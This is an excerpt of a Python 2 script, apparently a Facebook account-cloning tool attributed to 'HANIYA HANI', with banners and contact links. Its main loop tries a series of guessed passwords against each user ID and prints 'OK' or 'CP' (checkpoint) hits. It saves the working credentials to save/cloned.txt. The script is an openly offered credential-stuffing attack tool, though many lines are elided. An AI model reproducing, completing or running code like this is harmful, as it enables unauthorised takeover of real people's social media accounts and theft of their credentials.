...
║ FACEBOOK ♾ https://www.facebook.com/profile.php?id=100077961189798
║ whatsapp 🔰 https://wa.me/qr/L77VNHMBUH6LF1
╚══──────────────────────────
...
║AUTHOR 🌐 HANIYA HANI                     
║GITHUB ⚛ ANEEX12         
║FACEBOOK ♾ HANIYA HANI        
╚══──────────────────────────
"""
print("""
Author: HANIYA HANI from philipines
Facebook: HANIYA HANI
Warning :⚠️ INBOX ME FACEBOOK FOR HELP⚠️

""")
CorrectUsername = "HANIYA HANI"
CorrectPassword = "HANIYA786"
...
def login():
    os.system('clear')
    print logo1
    print "\033[1;91m[1]\x1b[1;91m══START 🌐( \033[1;92m )"
    time.sleep(0.05)
    print "\033[1;95m[2]\x1b[1;96m ══EXIT▫️"
    time.sleep(0.05)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;93m(HANIYA-OK)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(HANIYA-CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(HANIYA-OK)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(HANIYA-CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(HANIYA-OK)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(HANIYA-CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(HANI-CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(HANI-CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97mHANIYA HANI"""
